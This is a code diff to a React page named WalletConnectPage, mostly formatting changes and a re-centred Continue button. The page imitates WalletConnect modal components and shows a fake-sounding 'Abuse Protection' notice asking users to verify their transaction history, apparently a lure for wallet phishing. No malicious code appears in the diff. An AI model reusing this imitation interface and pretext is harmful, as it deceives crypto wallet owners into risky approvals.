@@ -142,10 +142,7 @@ export default function WalletConnectPage() {
 
 
 {/* içerik */}
-<w3m-router
-  className="embedded"
-  style={{ animation: "unset", height: "100%" }}
->
+<w3m-router className="embedded" style={{ animation: "unset", height: "100%" }}>
   <div
     className="w3m-router-container"
     view-direction="prev"
@@ -161,7 +158,7 @@ export default function WalletConnectPage() {
           flexDirection: "column",
           alignItems: "center",
           gap: "var(--wui-spacing-xl)",
-          height: "100%"
+          height: "100%",
         } as React.CSSProperties}
       >
         {/* Video */}
@@ -174,8 +171,7 @@ export default function WalletConnectPage() {
             width: 238 * 0.9,
             height: 360 * 0.9,
             overflow: "hidden",
-            borderRadius:
-              "clamp(0px,var(--wui-border-radius-m), 40px)"
+            borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)",
           }}
         >
           <img
@@ -187,7 +183,7 @@ export default function WalletConnectPage() {
               width: "214.2px",
               height: "324px",
               objectFit: "cover",
-              margin: "0 auto"
+              margin: "0 auto",
             }}
           />
           <wui-shimmer
@@ -196,8 +192,7 @@ export default function WalletConnectPage() {
             style={{
               width: "238px",
               height: "360px",
-              borderRadius:
-                "clamp(0px,var(--wui-border-radius-m), 40px)"
+              borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)",
             } as React.CSSProperties}
           />
         </div>
@@ -215,7 +210,7 @@ export default function WalletConnectPage() {
               fontSize: "0.95em",
               display: "inline-block",
               lineHeight: 1.4,
-              textTransform: "none"
+              textTransform: "none",
             } as React.CSSProperties}
           >
             <wui-icon
@@ -224,7 +219,7 @@ export default function WalletConnectPage() {
               style={{
                 "--local-width": "14px",
                 marginRight: "4px",
-                verticalAlign: "middle"
+                verticalAlign: "middle",
               } as React.CSSProperties}
             >
               <svg
@@ -253,7 +248,7 @@ export default function WalletConnectPage() {
                 marginRight: "2px",
                 display: "inline",
                 fontSize: "0.95em",
-                textTransform: "none"
+                textTransform: "none",
               }}
             >
               Note:
@@ -263,7 +258,7 @@ export default function WalletConnectPage() {
                 verticalAlign: "middle",
                 display: "inline",
                 fontSize: "1em",
-                textTransform: "none"
+                textTransform: "none",
               }}
             >
               This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
@@ -271,29 +266,36 @@ export default function WalletConnectPage() {
           </wui-text>
         </div>
 
-        {/* spacer */}
-        <div style={{ flex: 1 }} />
-
-        {/* Continue Button */}
-        <wui-button
-          variant="accent"
-          fullwidth
+        {/* Spacer + centered Continue button */}
+        <div
           style={{
-            "--local-width": "100%",
-            "--local-opacity-100": "1",
-            "--local-opacity-000": "0",
-            "--local-border-radius": "var(--wui-border-radius-m)"
-          } as React.CSSProperties}
+            flex: 1,
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            width: "100%",
+          }}
         >
-          <button
-            data-variant="accent"
-            data-icon-left="false"
-            data-icon-right="false"
-            data-size="lg"
+          <wui-button
+            variant="accent"
+            fullwidth
+            style={{
+              "--local-width": "100%",
+              "--local-opacity-100": "1",
+              "--local-opacity-000": "0",
+              "--local-border-radius": "var(--wui-border-radius-m)",
+            } as React.CSSProperties}
           >
-            Continue
-          </button>
-        </wui-button>
+            <button
+              data-variant="accent"
+              data-icon-left="false"
+              data-icon-right="false"
+              data-size="lg"
+            >
+              Continue
+            </button>
+          </wui-button>
+        </div>
       </wui-flex>
     </w3m-warning-view>
   </div>
